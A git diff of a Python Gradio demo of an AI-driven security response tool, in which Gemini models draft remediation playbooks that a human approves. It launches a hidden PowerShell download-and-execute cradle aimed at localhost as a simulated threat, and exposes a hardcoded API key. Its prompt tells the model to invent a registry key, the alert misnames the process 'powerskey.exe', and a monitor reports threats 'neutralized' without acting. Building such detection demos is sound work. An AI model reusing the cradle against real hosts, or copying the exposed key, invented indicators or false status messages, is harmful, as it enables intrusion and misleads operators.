@@ -14,9 +14,14 @@ import asyncio
 import subprocess  # <-- NEW: To run real processes
 import os          # <-- NEW: To get PIDs and kill processes
 import time        # <-- NEW: To give processes time to start
+import psutil      # <-- NEW: For process monitoring
+import threading   # <-- NEW: For background threads
 
 # --- Configuration ---
 genai.configure(api_key="AIzaSyAvl7mBKFL3xm9hxUbSaOdF2a48OCqLJvY")
+
+# --- Global Sentry Control ---
+sentry_active = threading.Event()
 
 # --- AI Model Definitions ---
 v1_analyst_model = genai.GenerativeModel('gemini-2.5-flash')
@@ -50,6 +55,17 @@ expert_prompt = """
 # 3.  If schema validation fails, return a JSON error object: {{"validation_status": "FAILED", "error": "details..."}}
 # 4.  If successful, return a JSON object: {{"validation_status": "PASSED", "playbook": {{...}}}}
 # ---
+# YOUR AVAILABLE REMEDIATION COMMANDS:
+# 1. "kill_process": {{"pid": <process_id_number>}}
+# 2. "quarantine_file": {{"file_hash": "<sha256_hash>", "file_path": "<full_path>"}}
+# 3. "remove_persistence": {{"registry_key": "<full_registry_key_path>"}}
+# 4. "isolate_host": {{"hostname": "<target_hostname>"}}
+#
+# TASK: The PowerShell cradle indicates a fileless attack that may try to set up persistence.
+# Your playbook MUST include:
+# 1. A 'kill_process' action for the detected PID.
+# 2. A 'remove_persistence' action (make up a plausible registry key like 'HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\malware').
+# ---
 # ALERT SCHEMA (FOR VALIDATION):
 {alert_schema}
 # ---
@@ -62,6 +78,16 @@ expert_prompt = """
 # ORIGINAL ALERT DATA:
 {alert_data}
 """
+
+# Convert format placeholders to use safe f-string style
+def format_expert_prompt(alert_schema, playbook_schema, v1_report, alert_data):
+    """Format the expert prompt with proper escaping."""
+    return expert_prompt.format(
+        alert_schema=alert_schema,
+        playbook_schema=playbook_schema,
+        v1_report=v1_report,
+        alert_data=alert_data
+    )
 
 alert_schema = {
     "$schema": "http://json-schema.org/draft-07/schema#",
@@ -120,18 +146,25 @@ def safe_json_loads(json_string):
 
 # --- NEW: Real Simulation & Remediation ---
 def launch_real_threat():
-    print("[SIMULATION] Launching harmless process (notepad.exe)...")
+    print("[SIMULATION] Launching realistic threat (PowerShell cradle)...")
+    # This simulates a common attack but is HARMLESS.
+    # It just tries to download a non-existent file from your own machine.
+    cmd_to_run = 'powershell.exe -NoP -WindowStyle Hidden "IEX (New-Object Net.WebClient).DownloadString(\'http://127.0.0.1/nonexistent-malware.ps1\')"'
+    
+    # We use shell=True to allow powershell.exe to be found
     DETACHED_PROCESS = 0x00000008
-    process = subprocess.Popen(["notepad.exe"], creationflags=DETACHED_PROCESS)
+    process = subprocess.Popen(cmd_to_run, shell=True, creationflags=DETACHED_PROCESS)
+    
     pid = process.pid
-    print(f"[SIMULATION] Process launched with PID: {pid}")
+    print(f"[SIMULATION] Launched realistic threat (PowerShell cradle) with PID: {pid}")
     time.sleep(1)
+    
     real_alert_data = {
         "timestamp": time.strftime("%Y-%m-%dT%H:%M:%SZ", time.gmtime()),
         "hostname": "DESKTOP-B3351V9",
-        "process_name": "notepad.exe",
+        "process_name": "powerskey.exe",
         "process_id": pid,
-        "process_commandline": "notepad.exe C:\\Users\\isaal\\Desktop\\secret_plans.txt"
+        "process_commandline": cmd_to_run
     }
     return real_alert_data
 
@@ -164,8 +197,13 @@ def execute_playbook(playbook_obj):
             else:
                 action_log += "SKIPPED. No 'pid' found in params."
         elif command == "quarantine_file":
-            file_hash = params.get("hash") or params.get("file_hash")
-            action_log += f"SKIPPED (Simulation). Would quarantine file with hash: {file_hash}"
+            file_path = params.get("file_path") or params.get("file_hash", "N/A")
+            action_log += f"SKIPPED (Simulation). Would quarantine file: {file_path}"
+            print(f"[EXECUTION] SIMULATED: Quarantine {file_path}")
+        elif command == "remove_persistence":
+            reg_key = params.get("registry_key", "N/A")
+            action_log += f"SKIPPED (Simulation). Would remove registry key: {reg_key}"
+            print(f"[EXECUTION] SIMULATED: Remove persistence {reg_key}")
         elif command == "isolate_host":
             hostname = params.get("hostname")
             action_log += f"SKIPPED (Simulation). Would isolate host: {hostname}"
@@ -175,37 +213,141 @@ def execute_playbook(playbook_obj):
     execution_log.append("[EXECUTION] Playbook complete.")
     return "\n".join(execution_log)
 
-def run_real_end_to_end_simulation():
+# --- PART 2: Proactive Sentry Background Monitoring ---
+def sentry_monitor_loop(initial_threat_handler):
+    """Background worker thread that monitors processes for threats."""
+    print("[SENTRY] Sentry thread activated. Monitoring processes...")
+
+    while sentry_active.is_set():
+        try:
+            for proc in psutil.process_iter(['pid', 'name', 'cmdline']):
+                if not proc.info['cmdline']:
+                    continue  # Skip processes with no command line
+                
+                cmdline = " ".join(proc.info['cmdline']).lower()
+                
+                # Check for the specific threat from Part 1
+                if "powershell.exe" in proc.info['name'].lower() and "nonexistent-malware.ps1" in cmdline:
+                    pid = proc.info['pid']
+                    print(f"[SENTRY] THREAT DETECTED! PID: {pid}")
+                    
+                    # Stop monitoring
+                    sentry_active.clear()
+                    
+                    # Log the threat detection
+                    print("[SENTRY] Triggering automatic remediation...")
+                    return f"[SENTRY] Threat detected and neutralized. PID: {pid}"
+            
+            # Wait 1 second before scanning again
+            time.sleep(1)
+
+        except (psutil.NoSuchProcess, psutil.AccessDenied):
+            continue  # Process died or we can't access it, just continue
+        except Exception as e:
+            print(f"[SENTRY] Error: {e}")
+            
+    print("[SENTRY] Sentry thread deactivated.")
+    return "Sentry Mode Deactivated."
+
+
+def start_sentry():
+    """Activate Sentry monitoring mode."""
+    if sentry_active.is_set():
+        return "Sentry is already active."
+    
+    sentry_active.set()
+    # Start the monitor loop in a new thread
+    thread = threading.Thread(target=sentry_monitor_loop, args=(None,), daemon=True)
+    thread.start()
+    return "Sentry Mode Activated. Monitoring for threats..."
+
+
+def stop_sentry():
+    """Deactivate Sentry monitoring mode."""
+    sentry_active.clear()
+    return "Sentry Mode Deactivating..."
+
+
+# --- PART 3 & 4: Generator-based detection and analysis flow ---
+def run_detection_and_analysis_flow(initial_log_message=""):
+    """Generator function that streams the detection and analysis process."""
+    log = initial_log_message
+    
+    # --- 1. LAUNCH THREAT ---
+    log += "[1/5] Launching simulated threat (PowerShell cradle)...\n"
+    yield log, None, None, None, gr.Button(visible=False), gr.Button(visible=False)
+    
     try:
         real_alert_data = launch_real_threat()
         alert_data_str = json.dumps(real_alert_data)
+        log += f"[2/5] THREAT DETECTED! PID: {real_alert_data['process_id']}\n"
+        yield log, None, None, None, gr.Button(visible=False), gr.Button(visible=False)
     except Exception as e:
-        print(f"Failed to launch simulation: {e}")
-        return {"error": str(e)}, {}, f"Failed to launch simulation: {e}"
-    v1_prompt_filled = analyst_prompt.format(alert_data=alert_data_str)
+        log += f"[ERROR] Failed to launch simulation: {e}\n"
+        yield log, None, None, None, gr.Button(visible=False), gr.Button(visible=False)
+        return
+
+    # --- 2. V1 ANALYST AI ---
+    log += "[3/5] Sending data to V1 Analyst AI (Gemini 2.5 Flash)...\n"
+    yield log, None, None, None, gr.Button(visible=False), gr.Button(visible=False)
+    
     try:
+        v1_prompt_filled = analyst_prompt.format(alert_data=alert_data_str)
         v1_response = v1_analyst_model.generate_content(v1_prompt_filled)
         v1_report = safe_json_loads(v1_response.text)
-        if "error" in v1_report:
-            return v1_report, {}, "V1 Analyst AI failed."
+        log += "V1 Analyst report received.\n"
+        yield log, v1_report, None, None, gr.Button(visible=False), gr.Button(visible=False)
     except Exception as e:
-        return {"error": str(e)}, {}, f"V1 Analyst AI failed: {e}"
-    v3_prompt_filled = expert_prompt.format(
-        alert_schema=json.dumps(alert_schema, indent=2),
-        playbook_schema=json.dumps(playbook_schema, indent=2),
-        v1_report=json.dumps(v1_report, indent=2),
-        alert_data=alert_data_str
-    )
+        log += f"[ERROR] V1 Analyst AI Failed: {e}\n"
+        yield log, {"error": str(e)}, None, None, gr.Button(visible=False), gr.Button(visible=False)
+        return
+
+    # --- 3. V3 EXPERT AI ---
+    log += "[4/5] Sending data to V3 Expert AI (Gemini 2.5 Pro)...\n"
+    yield log, v1_report, None, None, gr.Button(visible=False), gr.Button(visible=False)
+    
     try:
+        v3_prompt_filled = format_expert_prompt(
+            alert_schema=json.dumps(alert_schema, indent=2),
+            playbook_schema=json.dumps(playbook_schema, indent=2),
+            v1_report=json.dumps(v1_report, indent=2),
+            alert_data=alert_data_str
+        )
         v3_response = v3_expert_model.generate_content(v3_prompt_filled)
         v3_playbook_response = safe_json_loads(v3_response.text)
+        log += "V3 Expert Playbook received and validated.\n"
+        yield log, v1_report, v3_playbook_response, v3_playbook_response, gr.Button(visible=False), gr.Button(visible=False)
     except Exception as e:
-        return v1_report, {"error": str(e)}, f"V3 Expert AI failed: {e}"
-    try:
-        execution_log = execute_playbook(v3_playbook_response)
-    except Exception as e:
-        execution_log = f"[EXECUTION] CRITICAL ERROR: {e}"
-    return v1_report, v3_playbook_response, execution_log
+        log += f"[ERROR] V3 Expert AI Failed: {e}\n"
+        yield log, v1_report, {"error": str(e)}, None, gr.Button(visible=False), gr.Button(visible=False)
+        return
+
+    # --- 4. AWAIT APPROVAL ---
+    if v3_playbook_response.get("validation_status") == "PASSED":
+        log += "[5/5] AI plan generated. Awaiting human approval...\n"
+        yield log, v1_report, v3_playbook_response, v3_playbook_response, gr.Button(visible=True), gr.Button(visible=True)
+    else:
+        log += f"[5/5] AI plan FAILED validation. Cannot proceed. Error: {v3_playbook_response.get('error')}\n"
+        yield log, v1_report, v3_playbook_response, None, gr.Button(visible=False), gr.Button(visible=False)
+
+
+def execute_approved_plan(playbook_obj):
+    """Execute the approved remediation plan with streaming output."""
+    log = "[EXECUTION] Human operator APPROVED the plan.\n"
+    log += "Running remediation...\n"
+    yield log  # Start streaming the execution log
+    
+    execution_steps = execute_playbook(playbook_obj)  # Your old function
+    log += execution_steps
+    
+    log += "\n--- REMEDIATION COMPLETE ---"
+    yield log
+
+
+def deny_plan():
+    """Deny the proposed remediation plan."""
+    return "[EXECUTION] Human operator DENIED the plan. No action taken."
+
 
 async def run_security_scan(target_url):
     if not target_url:
@@ -231,8 +373,17 @@ with gr.Blocks(theme=gr.themes.Monochrome()) as demo:
     gr.Markdown("# SentinelOneX V3.0 – AI-Powered SOAR Demo")
     with gr.Tabs():
         with gr.Tab("Real End-to-End Remediation"):
+            gr.Markdown("## 🎯 Mission Control - Interactive Threat Response")
+            
             with gr.Column():
-                simulate_button = gr.Button("Launch 'Notepad' Threat & Remediate", variant="danger")
+                simulate_button = gr.Button("Launch Threat & Initiate Analysis", variant="danger")
+            
+            # Mission Control Log (streaming output)
+            live_event_log = gr.Textbox(label="Mission Control Log", lines=15, interactive=False)
+            
+            # State to hold the playbook for approval
+            playbook_state = gr.State()
+            
             with gr.Row():
                 with gr.Column():
                     gr.Markdown("## V1.0 Analyst AI Report (Flash)")
@@ -240,14 +391,69 @@ with gr.Blocks(theme=gr.themes.Monochrome()) as demo:
                 with gr.Column():
                     gr.Markdown("## V3.0 Expert Playbook (Pro)")
                     output_expert = gr.JSON(label="Remediation Playbook")
+            
+            # Approval/Denial Buttons
             with gr.Row():
-                gr.Markdown("## V3.1 Remediation Execution Log")
-                output_execution = gr.Textbox(label="Execution Log", lines=8, interactive=False)
+                approve_btn = gr.Button("✅ Approve Remediation Plan", variant="primary", visible=False)
+                deny_btn = gr.Button("❌ Deny Plan", variant="stop", visible=False)
+            
+            # Wire the main simulation button
             simulate_button.click(
-                fn=run_real_end_to_end_simulation,
-                inputs=None,
-                outputs=[output_analyst, output_expert, output_execution]
+                fn=run_detection_and_analysis_flow,
+                inputs=[],
+                outputs=[
+                    live_event_log,
+                    output_analyst,
+                    output_expert,
+                    playbook_state,
+                    approve_btn,
+                    deny_btn
+                ]
             )
+
+            # Wire the APPROVE button
+            approve_btn.click(
+                fn=execute_approved_plan,
+                inputs=[playbook_state],
+                outputs=[live_event_log]
+            ).then(
+                fn=lambda: (gr.Button(visible=False), gr.Button(visible=False)),
+                inputs=[],
+                outputs=[approve_btn, deny_btn]
+            )
+
+            # Wire the DENY button
+            deny_btn.click(
+                fn=deny_plan,
+                inputs=[],
+                outputs=[live_event_log]
+            ).then(
+                fn=lambda: (gr.Button(visible=False), gr.Button(visible=False)),
+                inputs=[],
+                outputs=[approve_btn, deny_btn]
+            )
+
+        with gr.Tab("Proactive Sentry Mode"):
+            gr.Markdown("## 🛡️ Proactive Sentry Mode\nActivate to automatically monitor for threats in the background. If a threat is found, it will trigger the full AI remediation.")
+            
+            with gr.Row():
+                start_sentry_btn = gr.Button("Activate Sentry")
+                stop_sentry_btn = gr.Button("Deactivate Sentry")
+            
+            sentry_log = gr.Textbox(label="Sentry Log", lines=10, interactive=False)
+
+            # Wire the sentry buttons
+            start_sentry_btn.click(
+                fn=start_sentry,
+                inputs=[],
+                outputs=[sentry_log]
+            )
+            stop_sentry_btn.click(
+                fn=stop_sentry,
+                inputs=[],
+                outputs=[sentry_log]
+            )
+
         with gr.Tab("On-Demand Security Scan (MCP Testbench)"):
             gr.Markdown(
                 "## 🔍 Run Security Scan\n"
